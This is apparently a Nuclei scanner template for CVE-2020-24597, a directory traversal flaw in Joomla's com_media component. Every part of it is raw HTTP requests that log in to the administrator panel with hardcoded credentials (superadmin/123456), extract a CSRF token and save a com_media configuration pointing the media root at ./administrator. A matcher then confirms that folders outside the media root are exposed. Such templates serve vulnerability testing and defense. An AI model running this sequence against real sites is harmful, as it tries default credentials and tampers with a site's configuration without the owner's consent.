id: CVE-2020-24597
info:
  name: Directory traversal in com_media
  author: Kien Nguyen
  severity: low
  description: Lack of input validation allows com_media root paths outside of the webroot.
  reference:
    - https://developer.joomla.org/security-centre/827-20200803-core-directory-traversal-in-com-media.html
    - https://github.com/HoangKien1020/CVE-2020-24597
  tags: cve, joomla, traversal
variables:
  username: superadmin
  passwd: "123456"
requests:
  - raw:
      - |
        GET /administrator/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /administrator/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&passwd={{passwd}}&option=com_login&task=login&return=aW5kZXgucGhw&{{token}}=1
      - |
        GET /administrator/index.php?option=com_config HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /administrator/index.php?option=com_config HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        jform%5Bfile_path%5D=./administrator&jform%5Bimage_path%5D=./administrator&id=13&component=com_media&return=&task=config.save.component.apply&{{token}}=1
      - |
        GET /administrator/index.php?option=com_media&view=imageList HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    cookie-reuse: true
    matchers:
      - type: word
        words:
          - "folder=manifests"
          - "folder=logs"
        part: body_5
        condition: and
    extractors:
      - type: regex
        name: token
        part: body
        group: 1
        internal: true
        regex:
          - name="([a-f0-9]{32})" value="1"
      - type: regex
        name: token
        part: body
        group: 1
        internal: true
        regex:
          - name="([a-f0-9]{32})" value="1"